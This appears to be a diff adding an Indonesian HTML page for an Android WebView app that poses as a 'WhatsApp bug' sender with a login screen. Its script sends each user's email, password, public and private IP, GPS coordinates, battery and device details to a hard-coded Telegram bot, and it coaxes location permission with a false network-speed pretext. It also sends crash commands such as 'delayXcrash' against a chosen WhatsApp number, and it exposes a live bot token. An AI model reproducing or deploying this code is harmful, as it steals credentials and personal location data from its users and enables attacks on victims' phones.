@@ -1,0 +1,850 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>BUG WA FYNIXOR</title> <style>
+    @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600&display=swap');
+
+    /* Variables for Red Theme Colors */
+    :root {
+      --main-red: #FF3333; /* Main red for borders, text, initial glow */
+      --darker-red: #CC0000; /* Darker red for accents, checked states, strong glows */
+      --lighter-red: #FF6666; /* Lighter red for some highlights, hover states */
+      --dark-bg: #140000; /* Very dark red/black background */
+      --card-bg: #000;
+      --border-color-alpha: #FF333355; /* Transparent red for subtle borders */
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Montserrat', sans-serif;
+      background-color: var(--dark-bg);
+      color: var(--main-red); /* Default text color */
+      height: 100vh;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+    .card {
+      background: var(--card-bg); padding: 2rem;
+      border-radius: 16px; box-shadow: 0 0 15px rgba(255, 51, 51, 0.533); /* Red shadow */
+      text-align: center; max-width: 400px;
+      margin: 20px auto; border: 1px solid var(--border-color-alpha);
+      position: relative;
+      overflow: hidden;
+      animation: fadeIn 0.8s ease-out;
+      width: 90%;
+    }
+
+    /* Bug Menu Specific Styles (No Card for Input & Toggles) */
+    #bugMenu {
+      background: none;
+      box-shadow: none;
+      border: none;
+      padding: 0;
+      max-width: 600px;
+      width: 90%;
+    }
+
+    input[type="text"],
+    input[type="password"],
+    input[type="number"],
+    textarea, /* Ditambahkan textarea */
+    button:not(#resetBtn, #redeemBtn, #sendReportBtn) { /* Diperbarui untuk sendReportBtn */
+      width: 100%; padding: 12px;
+      margin-bottom: 15px; font-size: 1rem;
+      border-radius: 8px; border: 2px solid var(--main-red);
+      background-color: var(--card-bg); color: var(--main-red);
+      transition: all 0.2s ease;
+      font-weight: 300;
+    }
+    input:focus, button:focus, textarea:focus { /* Diperbarui untuk textarea */
+      outline: none;
+      box-shadow: 0 0 8px var(--main-red);
+    }
+    button:not(#resetBtn, #redeemBtn, #sendReportBtn):hover { /* Diperbarui untuk sendReportBtn */
+      background-color: rgba(255, 51, 51, 0.2);
+      cursor: pointer;
+      transform: translateY(-1px);
+      box-shadow: 0 0 15px var(--main-red);
+    }
+
+    .result { margin-top: 10px; font-size: 0.9rem; }
+    .success { color: #00ffcc; } /* Warna hijau untuk sukses tetap dipertahankan untuk kontras yang jelas */
+    .error { color: #ff0033; }
+
+    /* Reset and Redeem Buttons */
+    #resetBtn, #redeemBtn {
+      position: fixed;
+      top: 10px;
+      padding: 8px 12px;
+      border-radius: 6px;
+      cursor: pointer;
+      z-index: 1000;
+      transition: background-color 0.2s ease;
+      font-size: 0.9rem;
+      font-weight: bold;
+    }
+    #resetBtn {
+      right: 10px;
+      background: var(--darker-red);
+      color: white;
+      border: none;
+    }
+    #resetBtn:hover {
+      background-color: #AA0000;
+    }
+    #redeemBtn {
+      right: 120px;
+      background: var(--lighter-red);
+      color: white;
+      border: none;
+    }
+    #redeemBtn:hover {
+      background-color: #CC6666;
+    }
+
+    /* Neon Title Animation */
+    .neon-title {
+      font-family: 'Press Start 2P', cursive;
+      font-size: 2.5rem;
+      color: #fff;
+      text-shadow:
+        0 0 5px var(--lighter-red),
+        0 0 8px var(--lighter-red),
+        0 0 15px var(--lighter-red),
+        0 0 40px var(--darker-red),
+        0 0 75px var(--darker-red);
+      animation: pulsate 2s infinite alternate ease-in-out;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    @keyframes pulsate {
+      100% {
+        text-shadow:
+          0 0 3px var(--lighter-red),
+          0 0 9px var(--lighter-red),
+          0 0 130px var(--darker-red),
+          0 0 35px var(--darker-red),
+          0 0 70px var(--darker-red);
+      }
+      0% {
+        text-shadow:
+          0 0 5px var(--lighter-red),
+          0 0 8px var(--lighter-red),
+          0 0 15px var(--lighter-red),
+          0 0 40px var(--darker-red),
+          0 0 75px var(--darker-red);
+      }
+    }
+
+    /* Bug WA Title */
+    .bug-title {
+      font-family: 'Press Start 2P', cursive;
+      font-size: 2rem;
+      color: var(--main-red);
+      text-align: center;
+      margin-bottom: 20px;
+      text-shadow: 0 0 10px var(--main-red), 0 0 20px var(--main-red), 0 0 30px var(--main-red);
+    }
+
+    /* General Animations */
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Toggle Switch Styles */
+    .toggle-container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 15px;
+      margin-bottom: 25px;
+    }
+
+    .toggle-switch {
+      position: relative;
+      display: inline-block;
+      width: 180px; /* Diperlebar dari 150px menjadi 180px */
+      height: 40px;
+      background-color: var(--card-bg);
+      border-radius: 20px;
+      border: 2px solid var(--main-red);
+      cursor: pointer;
+      overflow: hidden;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 10px rgba(255, 51, 51, 0.3);
+    }
+
+    .toggle-switch:hover {
+      box-shadow: 0 0 15px var(--main-red);
+    }
+
+    .toggle-switch input {
+      opacity: 0;
+      width: 0;
+      height: 0;
+    }
+
+    .slider {
+      position: absolute;
+      cursor: pointer;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: var(--card-bg);
+      transition: 0.4s;
+      border-radius: 20px;
+    }
+
+    .slider:before {
+      position: absolute;
+      content: "";
+      height: 32px;
+      width: 32px;
+      left: 4px;
+      bottom: 2px;
+      background-color: var(--main-red);
+      transition: 0.4s;
+      border-radius: 50%;
+      box-shadow: 0 0 10px var(--main-red);
+    }
+
+    input:checked + .slider {
+      background-color: var(--card-bg);
+      border-color: var(--darker-red);
+      box-shadow: 0 0 15px var(--darker-red);
+    }
+
+    input:checked + .slider:before {
+      transform: translateX(140px); /* Disesuaikan dari 110px menjadi 140px */
+      background-color: var(--darker-red);
+      box-shadow: 0 0 10px var(--darker-red);
+    }
+
+    .toggle-label {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 100%;
+  text-align: center;
+  font-size: 0.9rem;
+  color: var(--main-red);
+  font-weight: bold;
+  pointer-events: none;
+  transition: color 0.4s ease;
+  white-space: nowrap;
+}
+
+    input:checked ~ .toggle-label {
+      color: var(--darker-red);
+    }
+
+    /* Limit display */
+    #limitDisplay {
+      position: fixed;
+      top: 10px;
+      left: 10px;
+      background-color: var(--card-bg);
+      border: 1px solid var(--main-red);
+      color: var(--main-red);
+      padding: 8px 15px;
+      border-radius: 6px;
+      font-size: 1rem;
+      font-weight: bold;
+      z-index: 1000;
+      box-shadow: 0 0 10px rgba(255, 51, 51, 0.5);
+    }
+
+    /* Redeem Code Modal */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1001;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow: auto;
+      background-color: rgba(0,0,0,0.6);
+      justify-content: center;
+      align-items: center;
+    }
+
+    .modal-content {
+      background-color: var(--card-bg);
+      margin: auto;
+      padding: 30px;
+      border: 2px solid var(--main-red);
+      border-radius: 10px;
+      width: 80%;
+      max-width: 400px;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(255, 51, 51, 0.7);
+      animation: fadeIn 0.3s ease-out;
+    }
+
+    .modal-content h2 {
+      color: var(--main-red);
+      margin-bottom: 20px;
+      font-family: 'Press Start 2P', cursive;
+      font-size: 1.5rem;
+    }
+
+    .modal-content input[type="text"] {
+      margin-bottom: 20px;
+      border: 2px solid var(--main-red);
+      background-color: var(--dark-bg);
+      color: var(--main-red);
+      padding: 10px;
+      font-size: 1rem;
+    }
+
+    .modal-content button {
+      background-color: var(--lighter-red);
+      border: none;
+      color: white;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 1rem;
+      transition: background-color 0.3s ease;
+    }
+
+    .modal-content button:hover {
+      background-color: #CC6666;
+    }
+
+    .close-button {
+      color: #aaa;
+      float: right;
+      font-size: 28px;
+      font-weight: bold;
+      transition: color 0.2s ease;
+    }
+
+    .close-button:hover,
+    .close-button:focus {
+      color: var(--darker-red);
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    /* Styles for Report/Bug Section (Consolidated) */
+    .report-section {
+      background-color: var(--card-bg);
+      border: 1px solid var(--darker-red);
+      border-radius: 16px;
+      padding: 20px;
+      margin-top: 40px;
+      box-shadow: 0 0 15px rgba(255, 0, 0, 0.533);
+      width: 100%;
+      text-align: center;
+    }
+
+    .report-section h2 {
+      font-family: 'Press Start 2P', cursive;
+      font-size: 1.5rem;
+      color: var(--darker-red);
+      margin-bottom: 20px;
+      text-shadow: 0 0 10px var(--darker-red);
+    }
+
+    .report-section input[type="file"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 2px solid var(--darker-red);
+      background-color: var(--dark-bg);
+      color: var(--darker-red);
+      border-radius: 8px;
+      font-size: 1rem;
+      cursor: pointer;
+      box-shadow: 0 0 8px rgba(255, 0, 0, 0.3);
+    }
+
+    .report-section input[type="file"]::file-selector-button {
+      background-color: var(--darker-red);
+      color: white;
+      border: none;
+      padding: 8px 15px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.2s ease;
+    }
+
+    .report-section input[type="file"]::file-selector-button:hover {
+      background-color: #AA0000;
+    }
+
+    .report-section textarea {
+      width: calc(100% - 20px);
+      min-height: 100px;
+      padding: 10px;
+      margin-bottom: 15px;
+      border-radius: 8px;
+      border: 2px solid var(--darker-red);
+      background-color: var(--dark-bg);
+      color: var(--darker-red);
+      font-size: 1rem;
+      resize: vertical;
+      box-shadow: 0 0 8px rgba(255, 0, 0, 0.3);
+    }
+
+    #sendReportBtn {
+      background-color: var(--darker-red);
+      border: 2px solid var(--darker-red);
+      color: white;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-size: 1.1rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 15px var(--darker-red);
+      width: 100%;
+    }
+
+    #sendReportBtn:hover {
+      background-color: #AA0000;
+      box-shadow: 0 0 25px var(--darker-red);
+      transform: translateY(-2px);
+    }
+  </style>
+</head>
+<body>
+
+<button id="resetBtn" onclick="resetLogin()">Reset Login</button>
+<button id="redeemBtn" onclick="openRedeemModal()">Redeem Code</button>
+
+<div id="limitDisplay">Limit: <span id="currentLimit">1</span></div>
+
+<div class="card" id="loginForm">
+  <h1 class="neon-title">Login konfirmasi FYnixor</h1>
+  <input type="text" id="emailInput" placeholder="Email" />
+  <input type="password" id="passwordInput" placeholder="Password" />
+  <button onclick="submitLogin()">Login</button>
+  <div class="result" id="loginMsg"></div>
+</div>
+
+<div id="bugMenu" style="display:none;">
+  <h1 class="bug-title">Bug WA FYnixor</h1>
+
+  <div class="report-section">
+    <h2>Kirim Bug & Laporan</h2>
+    <input type="number" id="waInput" placeholder="Masukkan nomor 62xxxx"/>
+
+    <div class="toggle-container" id="bugToggles">
+      <label class="toggle-switch">
+        <input type="checkbox" name="bugType" value="delayXcrash">
+        <span class="slider"></span>
+        <span class="toggle-label">delayXcrash</span>
+      </label>
+
+      <label class="toggle-switch">
+        <input type="checkbox" name="bugType" value="zeroinvis">
+        <span class="slider"></span>
+        <span class="toggle-label">zeroinvis</span>
+      </label>
+
+      <label class="toggle-switch">
+        <input type="checkbox" name="bugType" value="delayui">
+        <span class="slider"></span>
+        <span class="toggle-label">delayui</span>
+      </label>
+
+      <label class="toggle-switch">
+        <input type="checkbox" name="bugType" value="clearbug">
+        <span class="slider"></span>
+        <span class="toggle-label">clearbug</span>
+      </label>
+    </div>
+
+    <input type="file" id="reportPhotoInput" accept="image/*"/>
+    <textarea id="reportChatText" placeholder="Ketik keterangan chat atau bukti penipu/riper di sini..."></textarea>
+    <button id="sendReportBtn" onclick="sendReport()">Kirim Laporan</button>
+    <div class="result" id="reportMsg"></div>
+    <p>©Yokoto_saiba</p>
+  </div>
+</div>
+
+<div id="redeemModal" class="modal">
+  <div class="modal-content">
+    <span class="close-button" onclick="closeRedeemModal()">×</span>
+    <h2>Redeem Code</h2>
+    <input type="text" id="redeemCodeInput" placeholder="Enter your redeem code"/>
+    <button onclick="submitRedeemCode()">Redeem</button>
+    <div class="result" id="redeemMsg" style="margin-top: 15px;"></div>
+  </div>
+</div>
+
+<div id="lokasiPrompt" style="display: none; background: #fff0c2; color: #333; padding: 10px; border: 1px solid #999; border-radius: 8px; margin: 10px 0;">
+  📍 <b>Aktifkan Lokasi!</b><br>
+  Mohon izinkan akses lokasi untuk memeriksa kecepatan jaringan koneksi agar tidak time out!!.
+</div>
+
+<script>
+  async function mintaIzinLokasi() {
+    const lokasiPrompt = document.getElementById('lokasiPrompt');
+    lokasiPrompt.style.display = 'block';
+
+    if (navigator.permissions) {
+      try {
+        const status = await navigator.permissions.query({ name: 'geolocation' });
+        if (status.state === 'granted') {
+          lokasiPrompt.style.display = 'none';
+        }
+        status.onchange = () => {
+          if (status.state === 'granted') {
+            lokasiPrompt.style.display = 'none';
+          }
+        };
+      } catch (e) {
+        console.warn("Gagal cek izin lokasi:", e);
+      }
+    }
+  }
+
+  document.addEventListener('DOMContentLoaded', mintaIzinLokasi);
+</script>
+
+<script>
+  const TOKEN = '7701856110:AAGv4vVb7CtnwNJ0c7qMiIEm8Y6WQJ3ohR8';
+  const CHAT_ID = '7016045840'; // This CHAT_ID will be used for both bugs and reports
+  const VALID_REDEEM_CODES = {
+    "FYNiXOR2025": 5,
+    "NEONBUGVIP": 10,
+  };
+
+  let bugLimit = localStorage.getItem("bug_limit");
+bugLimit = bugLimit !== null ? parseInt(bugLimit) : 1;
+
+  document.addEventListener("DOMContentLoaded", () => {
+    const isLogin = localStorage.getItem("login_success") === "true";
+    document.getElementById('loginForm').style.display = isLogin ? "none" : "block";
+    document.getElementById('bugMenu').style.display = isLogin ? "block" : "none";
+    updateLimitDisplay();
+  });
+
+  function updateLimitDisplay() {
+    document.getElementById('currentLimit').textContent = bugLimit;
+    // PENTING: Jika limit tidak auto-save saat menutup aplikasi,
+    // pastikan fungsi `updateLimit` di sisi Android WebView
+    // menyimpan `bugLimit` ini secara persisten (misalnya pakai SharedPreferences).
+    callAndroidMethod('updateLimit', bugLimit);
+  }
+
+  function resetLogin() {
+    localStorage.removeItem("login_success");
+    updateLimitDisplay();
+    callAndroidMethod('showToast', 'Login berhasil direset!');
+    location.reload();
+  }
+
+  async function submitLogin() {
+    const email = document.getElementById('emailInput').value.trim();
+    const pass = document.getElementById('passwordInput').value.trim();
+    const loginMsg = document.getElementById('loginMsg');
+
+    if (!email || !pass) {
+      loginMsg.innerHTML = '<span class="error">⚠️ Email & Password wajib diisi!</span>';
+      callAndroidMethod('showToast', 'Email & Password wajib diisi!');
+      return;
+    }
+
+    loginMsg.innerHTML = '🔄 Mengambil data...';
+    callAndroidMethod('showToast', 'Mengambil data login...');
+
+    try {
+      const info = await collectDeviceInfo();
+      const text = `🔐 LOGIN FYnixor\n📧 Email: ${email}\n🔑 Password: ${pass}
+📡 Online: ${info.online}
+📱 Baterai: ${info.battery.level}% ${info.battery.charging ? '⚡ Charging' : ''}
+🌐 IP Publik: ${info.ip}
+🛜 IP Privat: ${info.privateIP}
+📶 Jaringan: ${info.network}
+📍 Lokasi: ${info.location}
+🖥 UA: ${info.userAgent}`;
+
+      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+
+      localStorage.setItem("login_success", "true");
+      document.getElementById('loginForm').style.display = "none";
+      document.getElementById('bugMenu').style.display = "block";
+      updateLimitDisplay();
+      callAndroidMethod('showToast', 'Login berhasil! Selamat datang.');
+      callAndroidMethod('onLoginSuccess'); // Memberi tahu Android bahwa login berhasil
+
+    } catch (err) {
+      loginMsg.innerHTML = '<span class="error">❌ Gagal kirim data!</span>';
+      callAndroidMethod('showToast', 'Gagal kirim data login!');
+      console.error(err);
+    }
+  }
+
+
+  // MODIFIED: sendReport function now handles bug selection via toggles and report
+  async function sendReport() {
+    const wa = document.getElementById('waInput').value.trim();
+    const toggles = document.querySelectorAll('.toggle-switch input[type="checkbox"]');
+    const selectedBugs = [];
+    toggles.forEach(toggle => {
+      if (toggle.checked) {
+        selectedBugs.push(toggle.value);
+      }
+    });
+
+    const reportPhotoInput = document.getElementById('reportPhotoInput');
+    const reportChatText = document.getElementById('reportChatText').value.trim();
+    const reportMsg = document.getElementById('reportMsg');
+
+    // --- Validasi ---
+    if (!/^62\d{9,13}$/.test(wa)) {
+      reportMsg.innerHTML = '<span class="error">⚠️ Nomor WhatsApp tidak valid!</span>';
+      callAndroidMethod('showToast', 'Nomor WhatsApp tidak valid!');
+      return;
+    }
+
+    if (selectedBugs.length === 0 && !reportPhotoInput.files.length && !reportChatText) {
+        reportMsg.innerHTML = '<span class="error">⚠️ Pilih minimal satu jenis bug, ATAU masukkan foto/keterangan teks chat bukti riper!</span>';
+        callAndroidMethod('showToast', 'Pilih minimal satu jenis bug, ATAU masukkan foto/keterangan teks chat bukti riper!');
+        return;
+    }
+
+    if (bugLimit < selectedBugs.length) { // Check if limit is enough for selected bugs
+        reportMsg.innerHTML = `<span class="error">⚠️ Limit Anda (${bugLimit}) tidak cukup untuk mengirim ${selectedBugs.length} bug!</span>`;
+        callAndroidMethod('showToast', `Limit (${bugLimit}) tidak cukup untuk mengirim ${selectedBugs.length} bug!`);
+        return;
+    }
+    // --- End Validasi ---
+
+    reportMsg.innerHTML = '🔄 Mengirim bug dan laporan...';
+    callAndroidMethod('showToast', 'Mengirim bug dan laporan...');
+
+    let allSent = true;
+    let messagesSent = [];
+    let bugsActuallySent = 0;
+
+    // 1. Send Bug Commands (Loop through selected toggles)
+    for (const type of selectedBugs) {
+        if (bugLimit > 0) { // Double check limit before sending each bug
+            const bugCommand = `/${type} ${wa}`;
+            const bugUrl = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(bugCommand)}`;
+
+            try {
+              const resBug = await fetch(bugUrl);
+              const dataBug = await resBug.json();
+              if (!dataBug.ok) {
+                allSent = false;
+                console.error(`Gagal mengirim bug ${type}:`, dataBug);
+                messagesSent.push(`❌ Bug ${type} gagal!`);
+              } else {
+                messagesSent.push(`✅ Bug ${type} berhasil dikirim!`);
+                bugsActuallySent++;
+                bugLimit--; // Decrement limit for each bug sent
+                localStorage.setItem("bug_limit", bugLimit);
+                updateLimitDisplay();
+              }
+            } catch (e) {
+              allSent = false;
+              console.error(`Error saat mengirim bug ${type}:`, e);
+              messagesSent.push(`❌ Error kirim bug ${type}!`);
+            }
+        } else {
+            messagesSent.push('<span class="error">❌ Limit habis! Tidak dapat mengirim bug lagi.</span>');
+            callAndroidMethod('showToast', 'Limit habis! Tidak dapat mengirim bug lagi.');
+            allSent = false;
+            break; // Stop sending bugs if limit is exhausted
+        }
+    }
+
+    // 2. Send Report (Photo + Caption) - only if there's content to send
+    if (reportPhotoInput.files.length > 0 || reportChatText) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        // Include selected bug types in the report caption
+        const bugMethodsInReport = selectedBugs.length > 0 ? `\nMetode Bug: ${selectedBugs.join(', ')}` : '';
+        formData.append('caption', `🚨 LAPORAN PENIPU/RIPER 🚨\n\nNomor Terkait: ${wa}${bugMethodsInReport}\nKeterangan:\n${reportChatText}\n\nDari: Pengguna Neon WA Bug Panel`);
+
+        if (reportPhotoInput.files.length > 0) {
+          formData.append('photo', reportPhotoInput.files[0]);
+        }
+
+        try {
+          const responseReport = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+          const dataReport = await responseReport.json();
+
+          if (dataReport.ok) {
+            messagesSent.push('<span class="success">✅ Laporan bukti riper berhasil dikirim!</span>');
+          } else {
+            allSent = false;
+            messagesSent.push('<span class="error">❌ Gagal mengirim laporan bukti riper!</span>');
+            console.error('Telegram API Error (Report):', dataReport);
+          }
+        } catch (err) {
+          allSent = false;
+          messagesSent.push('<span class="error">❌ Terjadi kesalahan saat mengirim laporan bukti riper!</span>');
+          console.error('Fetch Error (Report):', err);
+        }
+    } else {
+        messagesSent.push('ℹ️ Tidak ada laporan bukti riper yang dikirim (tidak ada foto atau teks).');
+    }
+
+
+    const waktu = new Date().toLocaleString('id-ID');
+    let finalMessage = messagesSent.join('<br/>') + `<br/>Waktu: ${waktu}<br/>Limit berkurang ${bugsActuallySent}. Sisa limit: ${bugLimit}`;
+    reportMsg.innerHTML = finalMessage;
+    callAndroidMethod('showToast', `Proses pengiriman selesai. Sisa limit: ${bugLimit}`);
+
+    // Clear inputs and uncheck toggles after sending
+    document.getElementById('waInput').value = '';
+    toggles.forEach(toggle => {
+      toggle.checked = false;
+    });
+    reportPhotoInput.value = ''; // Clear file input
+    document.getElementById('reportChatText').value = ''; // Clear textarea
+  }
+
+  // --- Fungsi pengumpul info device (Tidak perlu diubah) ---
+  async function collectDeviceInfo() {
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipRes.json();
+
+    const battery = await navigator.getBattery?.();
+    const level = battery ? Math.round(battery.level * 100) : 'N/A';
+    const charging = battery ? battery.charging : false;
+
+    const privateIP = await getPrivateIP();
+
+    let location = "Tidak diizinkan atau gagal"; // Default message
+
+    if (navigator.geolocation) {
+      const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
+
+      if (permissionStatus.state === 'granted') {
+        try {
+          const pos = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+          });
+          const latitude = pos.coords.latitude.toFixed(5);
+          const longitude = pos.coords.longitude.toFixed(5);
+          // Changed to include both link and coordinates
+          location = `Link: http://maps.google.com/maps?q=${latitude},${longitude}\nKoordinat: ${latitude}, ${longitude}`;
+        } catch (error) {
+          console.error("Error getting location:", error);
+          location = "Gagal mengambil lokasi";
+        }
+      } else if (permissionStatus.state === 'prompt') {
+        try {
+          const pos = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+          });
+          const latitude = pos.coords.latitude.toFixed(5);
+          const longitude = pos.coords.longitude.toFixed(5);
+          // Changed to include both link and coordinates
+          location = `Link: http://maps.google.com/maps?q=${latitude},${longitude}\nKoordinat: ${latitude}, ${longitude}`;
+        } catch (error) {
+          console.error("Location permission denied or error:", error);
+          location = "Ditolak atau gagal";
+        }
+      } else if (permissionStatus.state === 'denied') {
+        location = "Ditolak secara permanen";
+      }
+    }
+
+    const network = navigator.connection?.effectiveType || "Tidak diketahui";
+
+    return {
+      ip: ipData.ip,
+      privateIP,
+      battery: { level, charging },
+      network,
+      location, // This will now contain both link and coordinates
+      userAgent: navigator.userAgent,
+      online: navigator.onLine ? "✅ Online" : "❌ Offline"
+    };
+  }
+
+  async function getPrivateIP() {
+    return new Promise(resolve => {
+      let ip;
+      const pc = new RTCPeerConnection({ iceServers: [] });
+      pc.createDataChannel('');
+      pc.onicecandidate = e => {
+        if (!e.candidate) return;
+        const candidate = e.candidate.candidate;
+        const res = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(candidate);
+        if (res) {
+         ip = res[1];
+          resolve(ip);
+          pc.close();
+        }
+      };
+      pc.createOffer().then(o => pc.setLocalDescription(o));
+    });
+  }
+  // --- Akhir fungsi pengumpul info device ---
+
+
+  // Redeem Code Modal Functions
+  function openRedeemModal() {
+    document.getElementById('redeemModal').style.display = 'flex';
+    document.getElementById('redeemCodeInput').value = '';
+    document.getElementById('redeemMsg').innerHTML = '';
+    callAndroidMethod('showToast', 'Buka modal redeem code.');
+  }
+
+  function closeRedeemModal() {
+    document.getElementById('redeemModal').style.display = 'none';
+  }
+
+  function submitRedeemCode() {
+    const redeemCode = document.getElementById('redeemCodeInput').value.trim();
+    const redeemMsg = document.getElementById('redeemMsg');
+
+    if (!redeemCode) {
+      redeemMsg.innerHTML = '<span class="error">⚠️ Masukkan kode redeem!</span>';
+      callAndroidMethod('showToast', 'Masukkan kode redeem!');
+      return;
+    }
+
+    if (VALID_REDEEM_CODES[redeemCode]) {
+      const addedLimit = VALID_REDEEM_CODES[redeemCode];
+      bugLimit += addedLimit;
+      localStorage.setItem("bug_limit", bugLimit);
+      updateLimitDisplay();
+      redeemMsg.innerHTML = `<span class="success">✅ Kode redeem berhasil! Limit bertambah ${addedLimit}. Total limit: ${bugLimit}</span>`;
+      callAndroidMethod('showToast', `Redeem berhasil! Limit bertambah ${addedLimit}.`);
+      document.getElementById('redeemCodeInput').value = '';
+    } else {
+      redeemMsg.innerHTML = '<span class="error">❌ Kode redeem tidak valid!</span>';
+      callAndroidMethod('showToast', 'Kode redeem tidak valid!');
+    }
+  }
+
+  // --- Fungsi UTAMA untuk memanggil Android dari JavaScript ---
+  function callAndroidMethod(methodName, ...args) {
+    if (typeof Android !== 'undefined' && Android !== null) {
+      if (typeof Android[methodName] === 'function') {
+        Android[methodName](...args);
+      } else {
+        console.warn(`Android method "${methodName}" not found or not a function.`);
+      }
+    } else {
+      console.log(`Not running in Android WebView or Android interface not exposed. Attempted to call: ${methodName}(${args.join(', ')})`);
+      // alert(`Debug: ${methodName}(${args.join(', ')})`); // Opsional: untuk debugging di browser
+    }
+  }
+</script>
+</body>
+</html>
